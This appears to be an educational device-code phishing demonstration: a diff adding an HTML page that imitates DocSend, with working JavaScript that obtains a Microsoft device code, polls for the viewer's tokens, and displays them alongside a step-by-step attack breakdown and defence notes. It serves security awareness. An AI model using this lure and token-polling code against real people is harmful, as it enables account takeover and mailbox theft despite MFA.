@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DocSend - Document Shared With You</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  /* ── DocSend-style phishing page ── */
+  body {
+    font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: #f7f7f7; color: #333;
+  }
+  body.captured-mode { background: #0d1117; color: #c9d1d9; }
+
+  .ds-nav {
+    background: #fff; border-bottom: 1px solid #e5e5e5;
+    padding: 14px 24px; display: flex; align-items: center;
+  }
+  .ds-logo {
+    font-size: 20px; font-weight: 700; color: #1b1b1b; letter-spacing: -0.5px;
+  }
+  .ds-logo span { color: #0061ff; }
+  .ds-nav-right { margin-left: auto; font-size: 13px; color: #888; }
+
+  .ds-page {
+    display: flex; justify-content: center; align-items: center;
+    min-height: calc(100vh - 53px); padding: 40px 20px;
+  }
+  .ds-card {
+    background: #fff; border-radius: 12px; box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+    padding: 48px 40px; max-width: 520px; width: 100%; text-align: center;
+  }
+  .ds-avatar {
+    width: 56px; height: 56px; border-radius: 50%; background: #0061ff;
+    color: #fff; font-size: 22px; font-weight: 700; display: flex;
+    align-items: center; justify-content: center; margin: 0 auto 20px;
+  }
+  .ds-sender { font-size: 14px; color: #888; margin-bottom: 4px; }
+  .ds-heading {
+    font-size: 20px; font-weight: 600; color: #1b1b1b; margin-bottom: 24px; line-height: 1.4;
+  }
+  .ds-file-row {
+    display: flex; align-items: center; gap: 14px;
+    background: #f7f9fc; border: 1px solid #e8ecf1; border-radius: 8px;
+    padding: 16px 20px; margin-bottom: 28px; text-align: left;
+  }
+  .ds-file-icon {
+    width: 42px; height: 52px; background: #2b579a; border-radius: 4px;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    color: #fff; font-size: 11px; font-weight: 700; letter-spacing: 0.5px;
+  }
+  .ds-file-info { flex: 1; min-width: 0; }
+  .ds-file-name {
+    font-size: 15px; font-weight: 600; color: #1b1b1b; margin-bottom: 2px;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .ds-file-meta { font-size: 12px; color: #999; }
+
+  .ds-download-btn {
+    display: inline-block; background: #0061ff; color: #fff; border: none;
+    padding: 13px 32px; font-size: 15px; font-weight: 600; border-radius: 8px;
+    cursor: pointer; text-decoration: none; transition: background 0.2s;
+    margin-bottom: 32px;
+  }
+  .ds-download-btn:hover { background: #0050d4; }
+
+  .ds-divider {
+    border: none; border-top: 1px solid #eee; margin: 0 0 24px;
+  }
+  .ds-verify-label {
+    font-size: 13px; color: #888; margin-bottom: 12px;
+  }
+  .ds-code {
+    font-size: 40px; font-weight: 700; letter-spacing: 8px; color: #0061ff;
+    font-family: 'SF Mono', Consolas, 'Courier New', monospace;
+    background: #f0f4ff; border: 2px dashed #b3d1ff; border-radius: 10px;
+    padding: 16px 24px; display: inline-block; margin-bottom: 16px;
+    min-height: 72px; min-width: 200px;
+  }
+  .ds-verify-instructions {
+    font-size: 13px; color: #999; line-height: 1.6;
+  }
+  .ds-verify-instructions a { color: #0061ff; text-decoration: none; font-weight: 500; }
+  .ds-verify-instructions a:hover { text-decoration: underline; }
+
+  .ds-footer {
+    text-align: center; padding: 20px; font-size: 11px; color: #bbb;
+  }
+
+  /* ── Phished banner overlay ── */
+  .banner {
+    display: none; background: #ff1744; color: #fff; text-align: center; padding: 32px;
+    font-size: 52px; font-weight: 800; border-radius: 12px; margin-bottom: 24px;
+    letter-spacing: 2px;
+  }
+  .banner.show { display: block; animation: pulse 0.8s ease-in-out infinite alternate; }
+  @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.03); opacity: 0.85; } }
+
+  /* ── Post-capture analysis (dark theme) ── */
+  .analysis {
+    display: none; max-width: 860px; margin: 0 auto; padding: 30px 20px;
+  }
+  .analysis.show { display: block; }
+
+  .analysis .status {
+    margin: 0 0 20px; padding: 14px 18px; background: #161b22; border: 1px solid #ff1744;
+    border-radius: 6px; font-family: monospace; font-size: 14px; color: #ff6b6b; font-weight: 600;
+  }
+  .section-title { font-size: 16px; font-weight: 600; color: #e6edf3; margin-bottom: 10px; }
+  .claims-grid {
+    display: grid; grid-template-columns: 160px 1fr; gap: 4px 16px; background: #161b22;
+    border: 1px solid #30363d; border-radius: 8px; padding: 16px; margin-bottom: 20px;
+  }
+  .claim-key { color: #7ee787; font-family: monospace; font-size: 13px; font-weight: 600; padding: 4px 0; }
+  .claim-val { color: #c9d1d9; font-family: monospace; font-size: 13px; word-break: break-all; padding: 4px 0; }
+  .raw-box {
+    background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 14px;
+    font-family: monospace; font-size: 11px; color: #8b949e; word-break: break-all;
+    max-height: 180px; overflow-y: auto; white-space: pre-wrap; margin-bottom: 20px;
+  }
+  .label {
+    font-size: 12px; color: #8b949e; margin-bottom: 6px; font-weight: 600;
+    text-transform: uppercase; letter-spacing: 0.5px;
+  }
+
+  /* ── Attack breakdown steps ── */
+  .attack-breakdown { margin-top: 40px; }
+  .attack-breakdown h2 {
+    font-size: 18px; color: #e6edf3; margin-bottom: 20px;
+    padding-bottom: 12px; border-bottom: 1px solid #30363d;
+  }
+  .step {
+    margin-bottom: 28px; padding: 20px 20px 20px 60px; background: #161b22;
+    border: 1px solid #30363d; border-radius: 10px; position: relative;
+  }
+  .step-num {
+    position: absolute; left: 16px; top: 18px; width: 32px; height: 32px;
+    background: #238636; color: #fff; border-radius: 50%; font-size: 14px;
+    font-weight: 700; display: flex; align-items: center; justify-content: center;
+  }
+  .step-num.attacker { background: #ff1744; }
+  .step-num.victim { background: #58a6ff; }
+  .step-num.result { background: #ff6d00; }
+  .step h3 { font-size: 14px; color: #e6edf3; margin-bottom: 8px; }
+  .step p { font-size: 13px; color: #8b949e; line-height: 1.7; margin-bottom: 10px; }
+  .api-block {
+    background: #0d1117; border: 1px solid #30363d; border-radius: 6px;
+    padding: 14px; font-family: 'SF Mono', Consolas, monospace; font-size: 12px;
+    color: #8b949e; white-space: pre-wrap; word-break: break-all;
+    overflow-x: auto; line-height: 1.6; margin-top: 8px;
+  }
+  .api-block .method { color: #7ee787; font-weight: 700; }
+  .api-block .url { color: #58a6ff; }
+  .api-block .header { color: #d2a8ff; }
+  .api-block .param-key { color: #ffa657; }
+  .api-block .param-val { color: #a5d6ff; }
+  .api-block .comment { color: #484f58; }
+  .api-block .response { color: #7ee787; }
+  .api-block .danger { color: #ff6b6b; }
+  .consequence {
+    margin-top: 10px; padding: 10px 14px; background: #1c1917;
+    border-left: 3px solid #ff6d00; border-radius: 0 6px 6px 0;
+    font-size: 12px; color: #fbbf24; line-height: 1.6;
+  }
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════════════════ -->
+<!--  DocSend-style phishing lure               -->
+<!-- ════════════════════════════════════════════ -->
+<div id="phishingPage">
+  <nav class="ds-nav">
+    <div class="ds-logo">doc<span>send</span></div>
+    <div class="ds-nav-right">Secure document sharing</div>
+  </nav>
+
+  <div class="ds-page">
+    <div class="ds-card">
+      <div class="ds-avatar">DF</div>
+      <div class="ds-sender">Shared by</div>
+      <div class="ds-heading">Mr Dodgy Fraud wants to share a document with you</div>
+
+      <div class="ds-file-row">
+        <div class="ds-file-icon">DOCX</div>
+        <div class="ds-file-info">
+          <div class="ds-file-name">Very tempting sounding.docx</div>
+          <div class="ds-file-meta">Microsoft Word &middot; 2.4 MB &middot; Shared just now</div>
+        </div>
+      </div>
+
+      <a class="ds-download-btn" href="https://microsoft.com/devicelogin" target="_blank" rel="noopener">
+        Click here to download
+      </a>
+
+      <hr class="ds-divider">
+
+      <div class="ds-verify-label">Your auth code is:</div>
+      <div class="ds-code" id="userCode">&nbsp;</div>
+      <div class="ds-verify-instructions">
+        Enter this code at
+        <a href="https://microsoft.com/devicelogin" target="_blank" rel="noopener">microsoft.com/devicelogin</a>
+        to verify your identity and access the document.
+      </div>
+    </div>
+  </div>
+
+  <div class="ds-footer">
+    This is an educational phishing simulation. Do not use against accounts you do not own.
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════ -->
+<!--  Post-capture analysis view                 -->
+<!-- ════════════════════════════════════════════ -->
+<div class="analysis" id="analysisView">
+  <div class="banner show" id="banner">&#x1F41F; PHISHED! &#x1F41F;</div>
+
+  <div class="status" id="status"></div>
+
+  <div class="section-title">Victim Identity (decoded from captured JWT)</div>
+  <div class="claims-grid" id="claimsGrid"></div>
+
+  <div class="label">Scopes Granted</div>
+  <div class="raw-box" id="scopeDisplay"></div>
+
+  <div class="label">Raw Access Token (first 300 chars)</div>
+  <div class="raw-box" id="rawToken"></div>
+
+  <div class="label">Refresh Token (first 300 chars &mdash; valid up to 90 days)</div>
+  <div class="raw-box" id="rawRefresh"></div>
+
+  <div class="attack-breakdown">
+    <h2>How This Attack Worked &mdash; Step by Step</h2>
+
+    <div class="step">
+      <div class="step-num attacker">1</div>
+      <h3>Attacker requests a device code (no authentication required)</h3>
+      <p>
+        The attacker makes a single unauthenticated POST request to Microsoft's public OAuth endpoint.
+        No credentials, no app secret, no registered redirect URI. Just a well-known first-party client ID.
+      </p>
+      <div class="api-block"><span class="method">POST</span> <span class="url">https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode</span>
+
+<span class="header">Content-Type: application/x-www-form-urlencoded</span>
+
+<span class="param-key">client_id</span>=<span class="param-val">d3590ed6-52b3-4102-aeff-aad2292ab01c</span>  <span class="comment">// Microsoft Office (public, first-party)</span>
+<span class="param-key">scope</span>=<span class="param-val">https://graph.microsoft.com/.default offline_access</span></div>
+      <p style="margin-top: 10px;">Microsoft responds with a short human-readable code. This code is not tied to any user account.</p>
+      <div class="api-block"><span class="response">200 OK</span>
+{
+  "<span class="param-key">user_code</span>":  "<span class="param-val" id="step1Code">--------</span>",       <span class="comment">// the code shown on the fake DocSend page</span>
+  "<span class="param-key">device_code</span>": "<span class="param-val">[long opaque string]</span>",  <span class="comment">// kept by the attacker for polling</span>
+  "<span class="param-key">verification_uri</span>": "<span class="param-val">https://microsoft.com/devicelogin</span>",
+  "<span class="param-key">expires_in</span>": <span class="param-val">900</span>,                    <span class="comment">// 15-minute window</span>
+  "<span class="param-key">interval</span>":   <span class="param-val">5</span>                      <span class="comment">// poll every 5 seconds</span>
+}</div>
+    </div>
+
+    <div class="step">
+      <div class="step-num attacker">2</div>
+      <h3>Attacker delivers the code via a fake document-sharing page</h3>
+      <p>
+        The attacker hosts a page mimicking a legitimate service (in this case, DocSend).
+        The victim receives a link via email or message. The page displays the code and a
+        "download" button that links to the <strong>real</strong> <code style="color:#58a6ff">microsoft.com/devicelogin</code>.
+        Email security gateways and URL scanners see a legitimate Microsoft URL and do not flag it.
+      </p>
+      <div class="api-block"><span class="comment">What the victim sees (the page you just saw):</span>
+
+  ┌──────────────────────────────────────────────┐
+  │  <span class="param-val">docsend</span>                                      │
+  │                                              │
+  │         <span class="param-val">[DF]</span>                                │
+  │      Shared by                               │
+  │  Mr Dodgy Fraud wants to share               │
+  │  a document with you                         │
+  │                                              │
+  │  ┌──────────────────────────────────────┐    │
+  │  │ <span class="param-val">DOCX</span>  Very tempting sounding.docx   │    │
+  │  │       Microsoft Word · 2.4 MB        │    │
+  │  └──────────────────────────────────────┘    │
+  │                                              │
+  │      [ <span class="url">Click here to download</span> ]            │
+  │      → links to microsoft.com/devicelogin    │
+  │                                              │
+  │  Your auth code is:                          │
+  │         <span class="danger" id="step2Code">--------</span>                        │
+  │                                              │
+  └──────────────────────────────────────────────┘</div>
+      <div class="consequence">
+        The victim sees a trusted-looking document sharing page and a real Microsoft domain.
+        There is nothing for email filters to block. The code is just a short string &mdash;
+        no malware, no attachments, no suspicious links.
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num victim">3</div>
+      <h3>Victim authenticates on the real Microsoft login page</h3>
+      <p>
+        The victim clicks "download" or visits <strong>microsoft.com/devicelogin</strong>,
+        enters the code, signs in with their username and password, and completes MFA.
+        This is entirely legitimate from Microsoft's perspective.
+      </p>
+      <div class="api-block"><span class="comment">What the victim sees at microsoft.com/devicelogin:</span>
+
+<span class="url">https://microsoft.com/devicelogin</span>
+
+  ┌─────────────────────────────────────┐
+  │                                     │
+  │   Enter the code displayed on your  │
+  │   device or app:                    │
+  │                                     │
+  │   ┌─────────────────────────────┐   │
+  │   │  <span class="danger" id="step3Code">--------</span>                │   │
+  │   └─────────────────────────────┘   │
+  │                                     │
+  │          [ Continue ]               │
+  │                                     │
+  └─────────────────────────────────────┘
+
+<span class="comment">Then: email → password → MFA push → "Are you trying to sign in to Microsoft Office?" → Yes</span></div>
+      <div class="consequence">
+        The victim's sign-in appears in Entra ID logs under their real IP address
+        and real device. It looks like a completely normal, legitimate login. MFA is fully satisfied.
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num attacker">4</div>
+      <h3>Attacker polls and receives the victim's tokens</h3>
+      <p>
+        While the victim authenticates, the attacker's script has been polling Microsoft's
+        token endpoint every 5 seconds. The moment the victim completes MFA, the next poll
+        returns a full set of tokens.
+      </p>
+      <div class="api-block"><span class="method">POST</span> <span class="url">https://login.microsoftonline.com/organizations/oauth2/v2.0/token</span>
+
+<span class="header">Content-Type: application/x-www-form-urlencoded</span>
+
+<span class="param-key">grant_type</span>=<span class="param-val">urn:ietf:params:oauth:grant-type:device_code</span>
+<span class="param-key">client_id</span>=<span class="param-val">d3590ed6-52b3-4102-aeff-aad2292ab01c</span>
+<span class="param-key">device_code</span>=<span class="param-val">[the opaque string from step 1]</span>
+
+<span class="comment">// Before victim authenticates:</span>
+<span class="danger">{ "error": "authorization_pending" }</span>
+
+<span class="comment">// After victim completes MFA:</span>
+<span class="response">200 OK</span>
+{
+  "<span class="param-key">access_token</span>":  "<span class="danger">eyJ0eXAiOi... (JWT with victim's identity + MFA claim)</span>",
+  "<span class="param-key">refresh_token</span>": "<span class="danger">0.AXYA... (valid for up to 90 days)</span>",
+  "<span class="param-key">token_type</span>":    "Bearer",
+  "<span class="param-key">expires_in</span>":    <span class="param-val">5399</span>,
+  "<span class="param-key">scope</span>":         "<span class="param-val" id="step4Scopes">...</span>"
+}</div>
+      <div class="consequence">
+        The attacker now has the victim's access token and refresh token.
+        These tokens carry the victim's full identity and the MFA claim,
+        so no further MFA is ever required.
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num result">5</div>
+      <h3>Attacker uses the tokens to access the victim's resources</h3>
+      <p>
+        With the captured tokens, the attacker can call any Microsoft Graph API endpoint
+        as the victim. Read email, send email, access files, exfiltrate data &mdash;
+        all from any IP address, any device, anywhere in the world.
+      </p>
+      <div class="api-block"><span class="comment">// Read the victim's mailbox:</span>
+<span class="method">GET</span> <span class="url">https://graph.microsoft.com/v1.0/me/messages</span>
+<span class="header">Authorization: Bearer</span> <span class="danger">[stolen access_token]</span>
+
+<span class="comment">// Send email as the victim:</span>
+<span class="method">POST</span> <span class="url">https://graph.microsoft.com/v1.0/me/sendMail</span>
+<span class="header">Authorization: Bearer</span> <span class="danger">[stolen access_token]</span>
+
+<span class="comment">// Access OneDrive / SharePoint files:</span>
+<span class="method">GET</span> <span class="url">https://graph.microsoft.com/v1.0/me/drive/root/children</span>
+<span class="header">Authorization: Bearer</span> <span class="danger">[stolen access_token]</span>
+
+<span class="comment">// When access token expires (~1 hour), silently get a new one:</span>
+<span class="method">POST</span> <span class="url">https://login.microsoftonline.com/organizations/oauth2/v2.0/token</span>
+<span class="param-key">grant_type</span>=<span class="param-val">refresh_token</span>
+<span class="param-key">client_id</span>=<span class="param-val">d3590ed6-52b3-4102-aeff-aad2292ab01c</span>
+<span class="param-key">refresh_token</span>=<span class="danger">[stolen refresh_token]</span>
+
+<span class="comment">// No password, no MFA, no user interaction. Works for up to 90 days.</span></div>
+      <div class="consequence">
+        The refresh token provides persistent access. Every hour, the attacker silently
+        exchanges it for a fresh access token. The victim sees no prompts, no notifications,
+        and no sign of compromise &mdash; until someone notices unusual activity in the sign-in logs.
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num" style="background:#d2a8ff; color:#0d1117;">?</div>
+      <h3>Why this is hard to detect</h3>
+      <div class="api-block"><span class="comment">What appears in the Entra ID sign-in logs:</span>
+
+<span class="param-val">Victim's login (Step 3):</span>
+  IP:          <span class="param-val">[victim's real IP]</span>
+  Device:      <span class="param-val">[victim's real device]</span>
+  Application: <span class="param-val">OfficeHome</span>
+  Status:      <span class="response">Success</span>
+  MFA:         <span class="response">Satisfied</span>
+  <span class="comment">&#8594; Looks completely normal</span>
+
+<span class="danger">Attacker's token usage (Step 5):</span>
+  IP:          <span class="danger">[VPN / different location]</span>
+  Device:      <span class="danger">[attacker's device]</span>
+  Application: <span class="param-val">OfficeHome / Outlook Web / Office365 Shell</span>
+  Status:      <span class="response">Success</span>
+  MFA:         <span class="response">Satisfied (carried by the token)</span>
+  <span class="comment">&#8594; Only suspicious because of the IP/device mismatch</span></div>
+      <div class="consequence">
+        The only detection signal is the geographic/device anomaly between the victim's
+        legitimate login and the attacker's subsequent access. Conditional Access policies
+        that restrict device code flow, or that require compliant/managed devices, are the
+        primary defences against this attack.
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+var CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+var TENANT = 'organizations';
+var SCOPE = 'https://graph.microsoft.com/.default offline_access';
+var DEVICE_CODE_URL = 'https://login.microsoftonline.com/' + TENANT + '/oauth2/v2.0/devicecode';
+var TOKEN_URL = 'https://login.microsoftonline.com/' + TENANT + '/oauth2/v2.0/token';
+
+var deviceCode = null;
+var pollTimer = null;
+
+function resetAndStart() {
+  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+  deviceCode = null;
+  document.body.classList.remove('captured-mode');
+  document.getElementById('phishingPage').style.display = '';
+  document.getElementById('analysisView').classList.remove('show');
+  startFlow();
+}
+
+function startFlow() {
+  fetch(DEVICE_CODE_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'client_id=' + encodeURIComponent(CLIENT_ID) + '&scope=' + encodeURIComponent(SCOPE)
+  })
+  .then(function(resp) {
+    if (!resp.ok) return resp.text().then(function(t) { throw new Error(resp.status + ': ' + t); });
+    return resp.json();
+  })
+  .then(function(data) {
+    deviceCode = data.device_code;
+    document.getElementById('userCode').textContent = data.user_code;
+    pollForToken();
+  })
+  .catch(function() {
+    pollTimer = setTimeout(startFlow, 10000);
+  });
+}
+
+function pollForToken() {
+  fetch(TOKEN_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'grant_type=' + encodeURIComponent('urn:ietf:params:oauth:grant-type:device_code') +
+          '&client_id=' + encodeURIComponent(CLIENT_ID) +
+          '&device_code=' + encodeURIComponent(deviceCode)
+  })
+  .then(function(resp) { return resp.json(); })
+  .then(function(data) {
+    if (data.access_token) {
+      showPhished(data);
+      return;
+    }
+    var error = data.error || '';
+    if (error === 'expired_token') {
+      resetAndStart();
+    } else if (error === 'slow_down') {
+      pollTimer = setTimeout(pollForToken, 10000);
+    } else {
+      pollTimer = setTimeout(pollForToken, 5000);
+    }
+  })
+  .catch(function() {
+    pollTimer = setTimeout(pollForToken, 5000);
+  });
+}
+
+document.addEventListener('DOMContentLoaded', startFlow);
+
+function decodeJwtPayload(jwt) {
+  try {
+    var parts = jwt.split('.');
+    if (parts.length !== 3) return {};
+    var b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+    return JSON.parse(atob(b64));
+  } catch (e) {
+    return {};
+  }
+}
+
+function showPhished(token) {
+  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+
+  // Switch from DocSend view to analysis view
+  document.getElementById('phishingPage').style.display = 'none';
+  document.body.classList.add('captured-mode');
+
+  document.getElementById('status').textContent = 'TOKEN CAPTURED at ' + new Date().toLocaleTimeString();
+
+  var claims = decodeJwtPayload(token.access_token || '');
+
+  var grid = document.getElementById('claimsGrid');
+  grid.innerHTML = '';
+
+  var fields = [
+    ['name',            'Display Name'],
+    ['upn',             'UPN (email)'],
+    ['unique_name',     'Username'],
+    ['tid',             'Tenant ID'],
+    ['oid',             'Object ID'],
+    ['iss',             'Issuer'],
+    ['app_displayname', 'App Name'],
+    ['appid',           'App (Client) ID'],
+    ['iat',             'Issued At'],
+    ['exp',             'Expires']
+  ];
+
+  for (var i = 0; i < fields.length; i++) {
+    var key = fields[i][0];
+    var label = fields[i][1];
+    var val = claims[key];
+    if (val === undefined) continue;
+    if (key === 'iat' || key === 'exp') val = new Date(val * 1000).toLocaleString();
+    var k = document.createElement('div'); k.className = 'claim-key'; k.textContent = label;
+    var v = document.createElement('div'); v.className = 'claim-val'; v.textContent = val;
+    grid.appendChild(k);
+    grid.appendChild(v);
+  }
+
+  var scopes = (claims.scp || token.scope || '').replace(/ /g, '\n');
+  document.getElementById('scopeDisplay').textContent = scopes || 'N/A';
+
+  var at = token.access_token || '';
+  document.getElementById('rawToken').textContent =
+    at.substring(0, 300) + '...\n\n[' + at.length + ' chars total]';
+
+  var rt = token.refresh_token || '';
+  document.getElementById('rawRefresh').textContent = rt
+    ? rt.substring(0, 300) + '...\n\n[' + rt.length + ' chars total]'
+    : 'N/A';
+
+  // Populate breakdown with actual values
+  var usedCode = document.getElementById('userCode').textContent;
+  document.getElementById('step1Code').textContent = usedCode;
+  document.getElementById('step2Code').textContent = usedCode;
+  document.getElementById('step3Code').textContent = usedCode;
+  document.getElementById('step4Scopes').textContent = (claims.scp || token.scope || 'N/A');
+
+  document.getElementById('analysisView').classList.add('show');
+  window.scrollTo({ top: 0, behavior: 'instant' });
+}
+</script>
+</body>
+</html>
